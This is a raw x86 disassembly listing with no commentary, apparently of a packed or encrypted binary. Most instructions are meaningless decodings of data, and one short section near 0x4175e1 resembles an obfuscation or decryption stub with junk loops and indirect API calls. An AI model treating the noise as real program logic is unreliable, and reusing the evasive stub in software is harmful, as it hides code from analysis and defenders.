  416fb2:	mov    dh,0x74
  416fb4:	(bad)  
  416fb5:	in     eax,dx
  416fb6:	mov    ds:0xe7e98d4b,al
  416fbb:	pop    ecx
  416fbc:	add    DWORD PTR ds:0x2b819a73,0xffffff98
  416fc3:	je     0x416f7b
  416fc5:	add    ch,BYTE PTR [edx]
  416fc7:	ds inc esi
  416fc9:	ficomp DWORD PTR [eax]
  416fcb:	xor    cl,BYTE PTR [esi+ebp*4-0x2]
  416fcf:	mov    dl,0x38
  416fd1:	and    BYTE PTR [edx-0x2f9d526],ch
  416fd7:	je     0x416fef
  416fd9:	mov    dl,0xe9
  416fdb:	daa    
  416fdc:	mov    al,0xaa
  416fde:	test   al,0xb6
  416fe0:	inc    edx
  416fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fe2:	and    esi,DWORD PTR [eax+0x6705a34]
  416fe8:	jne    0x417010
  416fea:	cmp    eax,0x489ca58
  416fef:	jp     0x416fc2
  416ff1:	xor    BYTE PTR [eax],0x17
  416ff4:	call   0xf1bed87c
  416ff9:	pop    ds
  416ffa:	pop    ds
  416ffb:	test   DWORD PTR [ebp+0x5877b691],edi
  417001:	mov    esi,0x16b2fc3d
  417006:	pop    esp
  417007:	stc    
  417008:	push   eax
  417009:	jl     0x416fe4
  41700b:	clc    
  41700c:	dec    edx
  41700d:	jge    0x417006
  41700f:	mov    cl,0xf6
  417011:	mov    ch,0xe0
  417013:	pop    ebp
  417014:	ins    DWORD PTR es:[edi],dx
  417015:	mov    ds,WORD PTR [ebp-0x3d]
  417018:	fs xchg edi,eax
  41701a:	call   0x65fdcbad
  41701f:	fstp   DWORD PTR [ecx-0x2f4fe67b]
  417025:	xchg   edx,eax
  417026:	jb     0x417097
  417028:	repz jne 0x416fc6
  41702b:	aaa    
  41702c:	push   cs
  41702d:	shr    esp,0x1c
  417030:	sub    eax,DWORD PTR [ecx-0x2d9df102]
  417036:	test   BYTE PTR [ebp-0x76],0x17
  41703a:	adc    esi,DWORD PTR [edi+esi*8+0x5c5ce719]
  417041:	adc    al,0xc5
  417043:	and    DWORD PTR [eax+0x678197b0],esp
  417049:	mov    esi,0xfcd7a04a
  41704e:	or     al,0x76
  417050:	push   es
  417051:	add    ax,si
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi-0x2ad48045],edx
  41706d:	sub    eax,DWORD PTR [ebp+0x2b]
  417070:	jg     0x4170ea
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x4170eb
  417077:	push   ecx
  417078:	loope  0x4170a6
  41707a:	cmp    al,BYTE PTR [ebx+0x3968e539]
  417080:	fnsave [ebx]
  417082:	lds    eax,FWORD PTR [ecx-0xd156f3c]
  417088:	aad    0x54
  41708a:	push   ebp
  41708b:	not    DWORD PTR [ecx+0x29075051]
  417091:	sub    al,0xe1
  417093:	lahf   
  417094:	inc    edx
  417095:	xchg   dh,dh
  417097:	and    esi,esp
  417099:	stos   BYTE PTR es:[edi],al
  41709a:	adc    al,0xb1
  41709c:	ror    BYTE PTR [esi+0x3c],1
  41709f:	mov    al,ds:0xa47b4c85
  4170a4:	pop    ss
  4170a5:	int3   
  4170a6:	mov    eax,ds:0x5269ff57
  4170ab:	mov    ds:0x9c3f4696,eax
  4170b0:	pushf  
  4170b1:	jo     0x4170c7
  4170b3:	inc    ebx
  4170b4:	jmp    0xa2e:0xb8f7e190
  4170bb:	fucomi st,st(7)
  4170bd:	nop
  4170be:	outs   dx,BYTE PTR ds:[esi]
  4170bf:	mov    eax,ds:0xab6cf3f7
  4170c4:	(bad)  [eax-0x723877a0]
  4170ca:	bound  ecx,QWORD PTR [eax+0x2d4577a1]
  4170d0:	add    BYTE PTR [ebp+0x29],0xde
  4170d4:	aaa    
  4170d5:	inc    ebx
  4170d6:	xor    dh,BYTE PTR [ecx-0xcd9962b]
  4170dc:	xchg   esp,eax
  4170dd:	adc    BYTE PTR [esi+0x7f],0x68
  4170e1:	jmp    0x5c4c519e
  4170e6:	mov    edi,DWORD PTR [edx+0xa]
  4170e9:	aas    
  4170ea:	xor    edx,DWORD PTR [ecx]
  4170ec:	sbb    eax,0xa293b4e8
  4170f1:	sbb    BYTE PTR [ecx+0x38],0x7
  4170f5:	or     eax,0xd334e4f9
  4170fa:	popf   
  4170fb:	call   0xe217:0x74d28817
  417102:	inc    ebp
  417103:	xchg   esi,eax
  417104:	or     BYTE PTR ds:0x7ef10b60,bh
  41710a:	xchg   BYTE PTR [eax+0x6b2bafa],ah
  417110:	fstp   QWORD PTR [ebx]
  417112:	in     al,dx
  417113:	xchg   dl,bl
  417115:	(bad)  
  417116:	pop    edx
  417117:	imul   esi,eax,0x58
  41711a:	mul    DWORD PTR [ebx+0x4b]
  41711d:	dec    esp
  41711e:	pop    ecx
  41711f:	and    dh,bl
  417121:	push   esp
  417122:	call   0xbf67b259
  417127:	pop    ecx
  417128:	sub    al,0x8c
  41712a:	ret    
  41712b:	clc    
  41712c:	ds push 0x661800b7
  417132:	dec    edx
  417133:	iret   
  417134:	mov    bl,0x10
  417136:	cmp    ebp,edi
  417138:	out    dx,al
  417139:	push   ds
  41713a:	adc    esp,ebx
  41713c:	sbb    al,0xd5
  41713e:	fimul  DWORD PTR [edi]
  417140:	iret   
  417141:	outs   dx,BYTE PTR cs:[esi]
  417143:	jns    0x417116
  417145:	mov    bl,0x22
  417147:	xor    eax,edx
  417149:	mov    cl,al
  41714b:	mov    cs,WORD PTR [ebx-0x18]
  41714e:	and    BYTE PTR [ecx+edi*2-0x5f0980fd],dl
  417155:	dec    esi
  417156:	adc    ebx,DWORD PTR [edi+0x57905ed6]
  41715c:	jecxz  0x417183
  41715e:	add    DWORD PTR [ecx+edi*8+0x52],0x10
  417163:	sbb    ch,BYTE PTR [ecx]
  417165:	mov    eax,ds:0x5eec3533
  41716a:	arpl   WORD PTR es:[edx+0x27],cx
  41716e:	sbb    ebx,eax
  417170:	add    BYTE PTR [ebx*1+0x6cb2be7a],0x99
  417178:	pop    ebx
  417179:	pusha  
  41717a:	jno    0x417131
  41717c:	test   al,0x8d
  41717e:	cmp    DWORD PTR ds:0x7a03bdff,0x58
  417185:	sbb    BYTE PTR [esi],0x50
  417188:	cmp    dl,BYTE PTR [esi]
  41718a:	nop
  41718b:	les    esp,FWORD PTR [edi-0x4afdcbd]
  417191:	mov    ds:0xe52ea218,eax
  417196:	jns    0x4171d0
  417198:	sahf   
  417199:	mov    ah,BYTE PTR [ebx+0x77]
  41719c:	jmp    0x41720d
  41719e:	js     0x4171fb
  4171a0:	stos   DWORD PTR es:[edi],eax
  4171a1:	popf   
  4171a2:	cmp    eax,0xcf150162
  4171a7:	pop    esi
  4171a8:	lods   al,BYTE PTR ds:[esi]
  4171a9:	mov    al,ds:0x99519d98
  4171ae:	sub    DWORD PTR [ebx],ebx
  4171b0:	dec    eax
  4171b1:	cmp    dh,dh
  4171b3:	or     eax,0x40657f9b
  4171b8:	bound  edx,QWORD PTR [eax]
  4171ba:	imul   dx,WORD PTR [edi],0xffae
  4171be:	mov    eax,esi
  4171c0:	jno    0x417228
  4171c2:	add    al,0x8f
  4171c4:	les    ebp,FWORD PTR [esi+0x5af190f3]
  4171ca:	sbb    ecx,DWORD PTR [ebx-0x1c6c60b8]
  4171d0:	pop    edi
  4171d1:	xchg   esp,eax
  4171d2:	loopne 0x4171af
  4171d4:	mov    bl,0x6d
  4171d6:	sahf   
  4171d7:	fist   WORD PTR [esi+0x3d7f8c44]
  4171dd:	test   DWORD PTR [esi+0x6b],esi
  4171e0:	test   DWORD PTR [eax],esp
  4171e2:	nop
  4171e3:	pop    eax
  4171e4:	inc    edi
  4171e5:	sub    bh,BYTE PTR [esi]
  4171e7:	iret   
  4171e8:	scas   eax,DWORD PTR es:[edi]
  4171e9:	adc    eax,0xe4b13587
  4171ee:	add    eax,0xe13229dd
  4171f3:	sub    ch,BYTE PTR [ecx-0x3a]
  4171f6:	loope  0x417240
  4171f8:	adc    edx,ebx
  4171fa:	pop    edx
  4171fb:	inc    ecx
  4171fc:	dec    esp
  4171fd:	jle    0x4171d1
  4171ff:	sar    DWORD PTR [ebp+ecx*4+0x4f],cl
  417203:	pop    esp
  417204:	xchg   esi,eax
  417205:	ins    BYTE PTR es:[edi],dx
  417206:	adc    eax,0x295413b8
  41720b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41720c:	dec    ebp
  41720d:	jmpw   0xb18d
  417211:	das    
  417212:	loope  0x4171de
  417214:	or     ebx,0x15
  417217:	not    al
  417219:	pop    ecx
  41721a:	lea    eax,[ebp-0x6b80b8d5]
  417220:	push   0x9
  417222:	and    BYTE PTR [ebp+edx*8+0x3d0bbd21],bh
  417229:	and    BYTE PTR [edi],0x5f
  41722c:	fwait
  41722d:	sbb    eax,0x69b0ccca
  417232:	add    al,0xfb
  417234:	xlat   BYTE PTR ds:[ebx]
  417235:	jecxz  0x41726b
  417237:	fwait
  417238:	cmp    al,0xb4
  41723a:	int3   
  41723b:	stos   BYTE PTR es:[edi],al
  41723c:	imul   eax,DWORD PTR [eax-0xdafcd9d],0x28541b30
  417246:	fwait
  417247:	jmp    0xbb31:0x870b7dca
  41724e:	push   es
  41724f:	mov    al,0x11
  417251:	add    DWORD PTR [ecx],edx
  417253:	dec    esp
  417254:	inc    esp
  417255:	jle    0x4171f3
  417257:	and    eax,DWORD PTR [edx]
  417259:	shl    DWORD PTR [ecx+ecx*1-0xe],cl
  41725d:	cmp    BYTE PTR [ecx+ecx*4-0x6c],dh
  417261:	cmp    ebx,edx
  417263:	mov    ecx,0x6800ea98
  417268:	(bad)  [ecx-0x38]
  41726b:	pop    ebp
  41726c:	mov    ebp,DWORD PTR [ecx-0x6632643e]
  417272:	outs   dx,DWORD PTR ds:[esi]
  417273:	jo     0x417291
  417275:	mov    bl,0xa
  417277:	dec    ebp
  417278:	jge    0x4172e2
  41727a:	jecxz  0x4172a9
  41727c:	adc    al,0xc3
  41727e:	hlt    
  41727f:	mov    cl,BYTE PTR [ebx]
  417281:	push   0xd04fbd5e
  417286:	inc    esi
  417287:	xchg   edi,eax
  417288:	mov    edi,0xa25ea7b2
  41728d:	jbe    0x41722b
  41728f:	mov    esp,0x187aba67
  417294:	fs sti 
  417296:	sti    
  417297:	pop    edi
  417298:	xchg   esp,eax
  417299:	repz scas eax,DWORD PTR es:[edi]
  41729b:	ja     0x417240
  41729d:	neg    BYTE PTR [ecx]
  41729f:	mov    esp,0xa488ac0a
  4172a4:	or     eax,0x90d3587c
  4172a9:	and    eax,0xb762bc8
  4172ae:	dec    eax
  4172af:	pop    edi
  4172b0:	lds    ebp,FWORD PTR [esi+0x194cdfa]
  4172b6:	sbb    BYTE PTR ds:[edx-0x6d22886c],bl
  4172bd:	mov    fs,WORD PTR [edi]
  4172bf:	push   esi
  4172c0:	xchg   ecx,eax
  4172c1:	es xchg edi,eax
  4172c3:	sbb    BYTE PTR [esp+edx*8-0x4ab7b21f],al
  4172ca:	mov    al,0x46
  4172cc:	cs out dx,eax
  4172ce:	xor    BYTE PTR [edi+0x78],ah
  4172d1:	xor    al,0xd4
  4172d3:	inc    esp
  4172d4:	inc    esp
  4172d5:	addr16 or al,0xef
  4172d8:	lods   al,BYTE PTR ds:[esi]
  4172d9:	call   0x53fcc66e
  4172de:	retf   
  4172df:	retf   
  4172e0:	in     eax,dx
  4172e1:	add    al,0x2c
  4172e3:	(bad)  
  4172e4:	pushf  
  4172e5:	jmp    0x3204:0xf8561455
  4172ec:	jb     0x41734d
  4172ee:	inc    ebx
  4172ef:	mov    ebx,0xcbeddbf0
  4172f4:	iret   
  4172f5:	cmc    
  4172f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172f7:	rcl    ebx,cl
  4172f9:	mov    BYTE PTR [ebp-0x3d912752],ah
  4172ff:	ror    ebx,0xa2
  417302:	xor    bl,BYTE PTR [ecx-0x6200ba98]
  417308:	rcr    BYTE PTR [esi+0x323279d9],1
  41730e:	mov    ch,0xb9
  417310:	or     bh,bh
  417312:	jne    0x41730c
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	rcl    BYTE PTR [esi-0x1dce2573],1
  417338:	sub    BYTE PTR [edi+0x78],bh
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x41732a
  417340:	fs pusha 
  417342:	push   ebp
  417343:	clc    
  417344:	enter  0xf07f,0xea
  417348:	adc    eax,0x78ca8a8
  41734d:	(bad)  
  41734e:	sar    DWORD PTR [edi-0x54f02a52],1
  417354:	cli    
  417355:	mov    dh,0xc8
  417357:	je     0x417306
  417359:	daa    
  41735a:	pop    edi
  41735b:	gs pushf 
  41735d:	addr16 or bl,bh
  417360:	mov    WORD PTR [eax-0x526eb0d3],gs
  417366:	pop    ecx
  417367:	ja     0x41732b
  417369:	aam    0x47
  41736b:	retf   0x5e45
  41736e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41736f:	sub    eax,DWORD PTR [ecx-0x24]
  417372:	mov    al,0x8a
  417374:	test   al,0x58
  417376:	inc    esi
  417377:	lea    ebp,[ecx+0x47]
  41737a:	call   0xca467d5e
  41737f:	in     eax,dx
  417380:	sub    al,0xcc
  417382:	cld    
  417383:	mov    bl,0x97
  417385:	inc    esi
  417386:	pop    es
  417387:	mov    WORD PTR [edi-0x3bd7ee91],ds
  41738d:	(bad)  
  41738e:	cli    
  41738f:	mov    ?,WORD PTR [edx-0x7887a0c8]
  417395:	xlat   BYTE PTR ds:[ebx]
  417396:	test   al,0xd7
  417398:	fdivr  QWORD PTR ds:0x873206f3
  41739e:	mov    ebx,0x3061bd97
  4173a3:	inc    edi
  4173a4:	test   BYTE PTR [eax+0x74],bl
  4173a7:	fisubr DWORD PTR ds:0xe09f9b56
  4173ad:	jbe    0x417417
  4173af:	repz xchg edi,eax
  4173b1:	or     eax,0xe759b842
  4173b6:	lods   eax,DWORD PTR ds:[esi]
  4173b7:	cmp    esi,esi
  4173b9:	jl     0x417408
  4173bb:	out    dx,eax
  4173bc:	into   
  4173bd:	mov    ah,0x9f
  4173bf:	int3   
  4173c0:	je     0x4173b5
  4173c2:	sldt   WORD PTR [edi-0x74]
  4173c6:	xor    eax,0xae79c9b0
  4173cb:	std    
  4173cc:	jmp    0x540d:0xcd17096a
  4173d3:	inc    esi
  4173d4:	repz xor ch,BYTE PTR [eax+0x6f]
  4173d8:	pop    edx
  4173d9:	sbb    eax,0x866a57de
  4173de:	or     BYTE PTR [eax],dh
  4173e0:	push   ebx
  4173e1:	cld    
  4173e2:	je     0x417383
  4173e4:	jbe    0x417407
  4173e6:	test   al,0x57
  4173e8:	dec    eax
  4173e9:	sub    ch,dl
  4173eb:	mov    esp,0xfd995968
  4173f0:	mov    edi,DWORD PTR [ebx-0x5020055f]
  4173f6:	push   ebp
  4173f7:	add    DWORD PTR [eax],0x7d42dfb2
  4173fd:	mov    BYTE PTR [edx],bh
  4173ff:	mov    ecx,0x24e97b27
  417404:	xchg   ecx,eax
  417405:	sub    eax,0x457f7d6a
  41740a:	inc    esp
  41740b:	push   cs
  41740c:	adc    dh,BYTE PTR [ebx+0x28]
  41740f:	cmc    
  417410:	inc    ebp
  417411:	shr    BYTE PTR [eax-0xa],0xf4
  417415:	pop    ss
  417416:	inc    esp
  417417:	out    dx,al
  417418:	cwde   
  417419:	push   cs
  41741a:	les    ecx,FWORD PTR [esi+0x358726a6]
  417420:	outs   dx,DWORD PTR ds:[esi]
  417421:	dec    edx
  417422:	jbe    0x4174a1
  417424:	mov    bl,0xc4
  417426:	fucomi st,st(5)
  417428:	and    al,0x47
  41742a:	mov    ah,0xff
  41742c:	xchg   edi,eax
  41742d:	mov    eax,ds:0x567cc288
  417432:	or     edx,DWORD PTR [esi+0x7cfd191c]
  417438:	fsub   DWORD PTR [ebx+0x77]
  41743b:	pusha  
  41743c:	sub    BYTE PTR [eax+ecx*2+0x73875a73],0x4b
  417444:	mov    gs,WORD PTR [ebp-0x69bcba2d]
  41744a:	ins    BYTE PTR es:[edi],dx
  41744b:	push   ds
  41744c:	test   eax,0x1cb0a225
  417451:	xor    ebp,DWORD PTR [edx-0x6c395fa7]
  417457:	dec    eax
  417458:	ror    dh,1
  41745a:	repz dec esi
  41745c:	fld    st(2)
  41745e:	xlat   BYTE PTR ds:[ebx]
  41745f:	test   al,0xbe
  417461:	les    ebp,FWORD PTR [ebp+0x3a4457b6]
  417467:	pop    ecx
  417468:	mov    al,ds:0x3e557b7e
  41746d:	push   ds
  41746e:	shl    ebx,cl
  417470:	sbb    esi,DWORD PTR [esi+0x3c]
  417473:	sbb    eax,0xfa1c9969
  417478:	xchg   BYTE PTR [esi-0x3a],bh
  41747b:	push   edi
  41747c:	sub    eax,0xfba0de77
  417481:	mov    eax,0x39a8bde5
  417486:	jno    0x4174f8
  417488:	lock mov ds:0xd6cf1ec0,eax
  41748e:	mov    ds:0xdccbeb44,al
  417493:	inc    esi
  417494:	jp     0x4174b9
  417496:	std    
  417497:	leave  
  417498:	rep outs dx,DWORD PTR ds:[esi]
  41749a:	int    0x7c
  41749c:	data16 rcl ch,0xe9
  4174a0:	pop    ebp
  4174a1:	es leave 
  4174a3:	sti    
  4174a4:	stos   DWORD PTR es:[edi],eax
  4174a5:	push   edx
  4174a6:	test   edi,edi
  4174a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174a9:	in     eax,0x8c
  4174ab:	icebp  
  4174ac:	push   cs
  4174ad:	retf   0xb0b7
  4174b0:	enter  0xa7af,0xa0
  4174b4:	call   0x4e47:0xebcf1f20
  4174bb:	outs   dx,BYTE PTR ds:[esi]
  4174bc:	das    
  4174bd:	jge    0x41744c
  4174bf:	arpl   WORD PTR [ecx+0x40],ax
  4174c2:	inc    esi
  4174c3:	pop    edx
  4174c4:	iret   
  4174c5:	dec    ebx
  4174c6:	pop    eax
  4174c7:	ins    BYTE PTR es:[edi],dx
  4174c8:	out    dx,eax
  4174c9:	jmp    0x4174e4
  4174cb:	mov    esi,0x59204eb8
  4174d0:	ret    
  4174d1:	push   esi
  4174d2:	cmp    al,0x11
  4174d4:	sahf   
  4174d5:	push   ss
  4174d6:	add    al,0x4d
  4174d8:	ret    
  4174d9:	retf   
  4174da:	jl     0x4174c6
  4174dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174dd:	shr    DWORD PTR ds:0x63ef6556,0x12
  4174e4:	add    esp,eax
  4174e6:	fld    st(1)
  4174e8:	mov    eax,0x1a30939d
  4174ed:	sar    DWORD PTR [edi],cl
  4174ef:	jl     0x417510
  4174f1:	aas    
  4174f2:	cmc    
  4174f3:	or     BYTE PTR [edi+ebp*1+0x6d],ch
  4174f7:	jecxz  0x417524
  4174f9:	jp     0x417487
  4174fb:	mov    eax,ds:0x5cde5879
  417500:	mov    ss,WORD PTR [ecx]
  417502:	cdq    
  417503:	(bad)  
  417504:	rcl    bl,1
  417506:	add    dh,bl
  417508:	mov    ds,WORD PTR [ecx+0x14]
  41750b:	mov    dh,0xed
  41750d:	and    DWORD PTR [ebx+0x60],ebx
  417510:	call   0xb27d:0xc336c3a3
  417517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417518:	lds    ebp,FWORD PTR [eax+0x17]
  41751b:	inc    esp
  41751c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41751d:	xchg   esp,eax
  41751e:	jecxz  0x4174b6
  417520:	js     0x41757d
  417522:	push   ecx
  417523:	add    BYTE PTR [ebx],cl
  417525:	mov    bl,0x1b
  417527:	outs   dx,BYTE PTR ds:[esi]
  417528:	push   esi
  417529:	aaa    
  41752a:	shl    DWORD PTR [edi+0x6d],cl
  41752d:	ja     0x4174e3
  41752f:	xlat   BYTE PTR ds:[ebx]
  417530:	jae    0x41758d
  417532:	xchg   bl,ch
  417534:	cmc    
  417535:	cs add ebp,esi
  417538:	xchg   ecx,eax
  417539:	(bad)  
  41753a:	cmp    edx,DWORD PTR [edi]
  41753c:	mov    edx,0x2ee0c22d
  417541:	cmp    esp,esi
  417543:	or     DWORD PTR [ebp+0x53fccd16],0x4a490342
  41754d:	jae    0x417508
  41754f:	test   edx,ebx
  417551:	fs stos BYTE PTR es:[edi],al
  417553:	adc    eax,0xe9c19f92
  417558:	inc    ebp
  417559:	push   ecx
  41755a:	mov    ebp,0x13e025d6
  41755f:	les    ebp,FWORD PTR [edi]
  417561:	mov    edx,DWORD PTR [edi]
  417563:	pop    ebx
  417564:	pop    eax
  417565:	arpl   dx,di
  417567:	mov    ss,WORD PTR [ebx+0xb]
  41756a:	and    DWORD PTR [ebx-0x67],0xffffffc0
  41756e:	push   0xf5faeffb
  417573:	inc    esi
  417574:	push   esp
  417575:	mov    al,ds:0x68801559
  41757a:	fcomip st,st(1)
  41757c:	je     0x41758d
  41757e:	repnz sbb cl,BYTE PTR [esi-0x8]
  417582:	push   0xef2aed00
  417587:	aaa    
  417588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417589:	xchg   DWORD PTR [esi-0x673326fc],ebp
  41758f:	pop    ebp
  417590:	call   0x3d91:0x46a49aac
  417597:	cmp    eax,0x368a7883
  41759c:	xchg   esi,eax
  41759d:	idiv   BYTE PTR [eax]
  41759f:	iret   
  4175a0:	les    esp,FWORD PTR [edx+eax*1-0x2c]
  4175a4:	and    al,0xed
  4175a6:	adc    al,0x87
  4175a8:	das    
  4175a9:	out    0x85,al
  4175ab:	aas    
  4175ac:	dec    esp
  4175ad:	fistp  QWORD PTR ds:0xf48180c9
  4175b3:	push   ds
  4175b4:	xchg   edx,eax
  4175b5:	pop    es
  4175b6:	adc    eax,0xc46fee16
  4175bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175bc:	enter  0x2369,0x9e
  4175c0:	jmp    0x4175c5
  4175c2:	xchg   ebp,eax
  4175c3:	adc    eax,0x1bcfc131
  4175c8:	jbe    0x417639
  4175ca:	inc    eax
  4175cb:	sub    DWORD PTR [edx+0x73],eax
  4175ce:	xor    dh,BYTE PTR [eax+edx*1]
  4175d1:	sub    esi,ebx
  4175d3:	sbb    DWORD PTR [edx+0x75],0x1e1084ac
  4175da:	add    eax,esi
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a899,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a899,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a899,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7d9
  41760e:	push   0x42a825
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a972
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a899,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a899
  417633:	dec    eax
  417634:	mov    ds:0x42a899,eax
  417639:	mov    eax,ds:0x42a899
  41763e:	dec    eax
  41763f:	mov    ds:0x42a899,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a82d,0x0
  41765b:	mov    eax,ds:0x42a82d
  417660:	inc    eax
  417661:	mov    ds:0x42a82d,eax
  417666:	cmp    DWORD PTR ds:0x42a82d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42ab12
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a82d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	jbe    0x417694
  4176bc:	ror    bl,cl
  4176be:	jg     0x4176ed
  4176c0:	jg     0x41773a
  4176c2:	add    eax,0x6878787e
  4176c7:	cmp    eax,0xb2d38e1f
  4176cc:	jbe    0x417698
  4176ce:	popa   
  4176cf:	(bad)  
  4176d0:	jmp    0xd77b:0x43c74907
  4176d7:	mov    dh,0x96
  4176d9:	mov    dh,0xcc
  4176db:	in     al,dx
  4176dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176dd:	push   ecx
  4176de:	dec    esp
  4176df:	cmc    
  4176e0:	mov    ?,WORD PTR [esi-0x71ffc476]
  4176e6:	daa    
  4176e7:	fbstp  TBYTE PTR [ecx+0x44bc2024]
  4176ed:	out    dx,eax
  4176ee:	lds    ecx,FWORD PTR [ecx+0x72314c1e]
  4176f4:	mov    esp,0xb12c8a02
  4176f9:	cmp    BYTE PTR [edx+edi*4+0x3957c074],ah
  417700:	pop    esi
  417701:	(bad)  
  417703:	mov    ecx,ds
  417705:	nop
  417706:	(bad)  
  417707:	retf   
  417708:	pop    ds
  417709:	outs   dx,DWORD PTR ds:[esi]
  41770a:	xchg   edi,eax
  41770b:	imul   esp,DWORD PTR [eax+0x4e],0x63
  41770f:	xchg   edx,eax
  417710:	es pop eax
  417712:	repz pop eax
  417714:	je     0x41770c
  417716:	sbb    al,0xfc
  417718:	mov    ebp,0xe43a791e
  41771d:	dec    eax
  41771e:	sahf   
  41771f:	fisub  WORD PTR [ecx+0x66713a26]
  417725:	arpl   WORD PTR [edi-0x3b68e752],ax
  41772b:	in     al,dx
  41772c:	xor    DWORD PTR [esi+0x13ec8448],ecx
  417732:	out    dx,al
  417733:	xchg   esp,eax
  417734:	xor    eax,0xee7676e0
  417739:	test   al,0xb9
  41773b:	jne    0x4177b5
  41773d:	in     al,0x31
  41773f:	fistp  DWORD PTR [eax+ebp*2+0x29]
  417743:	mov    DWORD PTR [edi],esi
  417745:	adc    ecx,ebp
  417747:	fs ins DWORD PTR es:[edi],dx
  417749:	loopne 0x417763
  41774b:	mov    esp,0x8bc4cd67
  417750:	in     eax,dx
  417751:	js     0x4177c6
  417753:	sub    DWORD PTR [esp+ebx*1+0x73],ebp
  417757:	mov    bh,0x34
  417759:	sbb    eax,0x626a3aba
  41775e:	addr16 inc edi
  417760:	xchg   ecx,edx
  417762:	idiv   BYTE PTR [ebx]
  417764:	push   cs
  417765:	aaa    
  417766:	push   0xffffffaa
  417768:	popf   
  417769:	or     al,dh
  41776b:	retf   
  41776c:	and    BYTE PTR [edx+0x21b8e13d],ah
  417772:	stc    
  417773:	cld    
  417774:	push   ecx
  417775:	fild   QWORD PTR [edx+eax*1+0x3946106a]
  41777c:	adc    bl,bl
  41777e:	xchg   ebx,ebp
  417780:	push   esp
  417781:	push   ss
  417782:	jl     0x4177ad
  417784:	push   ebx
  417785:	data16 (bad) 
  417787:	mov    al,0x64
  417789:	loopne 0x4177d7
  41778b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41778c:	mov    fs,WORD PTR [ebx-0x5db1914c]
  417792:	ds retf 0xc642
  417796:	jns    0x41773f
  417798:	ret    
  417799:	retf   0x5093
  41779c:	test   BYTE PTR [ecx],ah
  41779e:	jnp    0x4177d3
  4177a0:	sbb    BYTE PTR [esi-0xa],cl
  4177a3:	mov    fs,WORD PTR [ebx+0x705449cf]
  4177a9:	test   eax,0x6852ec42
  4177ae:	(bad)  
  4177af:	add    al,0xab
  4177b1:	add    BYTE PTR [edx-0x77cfdd53],0x3e
  4177b8:	imul   ecx,DWORD PTR [esi],0xd7f6de5a
  4177be:	enter  0xfc6d,0xbc
  4177c2:	and    ah,bh
  4177c4:	or     al,0x55
  4177c6:	cs xchg bl,dh
  4177c9:	xor    DWORD PTR [ecx+0x45d285ce],eax
  4177cf:	test   al,0x59
  4177d1:	pop    ds
  4177d2:	in     al,dx
  4177d3:	xor    al,0x71
  4177d5:	xchg   ebx,eax
  4177d6:	jb     0x4177a3
  4177d8:	nop
  4177d9:	cmc    
  4177da:	mov    eax,ds:0xb1e9e24a
  4177df:	mov    ds:0x499dc0ea,al
  4177e4:	and    al,bl
  4177e6:	jne    0x417818
  4177e8:	inc    ecx
  4177e9:	pop    ebx
  4177ea:	jecxz  0x41780f
  4177ec:	mov    esp,DWORD PTR [esi-0x789bc3fa]
  4177f2:	cmp    BYTE PTR [eax],ch
  4177f4:	mov    dh,0x82
  4177f6:	fnsave [edi-0x28]
  4177f9:	pop    edi
  4177fa:	(bad)  
  4177fb:	stos   BYTE PTR es:[edi],al
  4177fc:	cmp    ebx,edx
  4177fe:	arpl   ax,cx
  417800:	call   0x9e41:0xe1ef2e8c
  417807:	mov    dh,BYTE PTR [ebp+0x76]
  41780a:	jecxz  0x4177d5
  41780c:	mov    esi,DWORD PTR [edi-0x32]
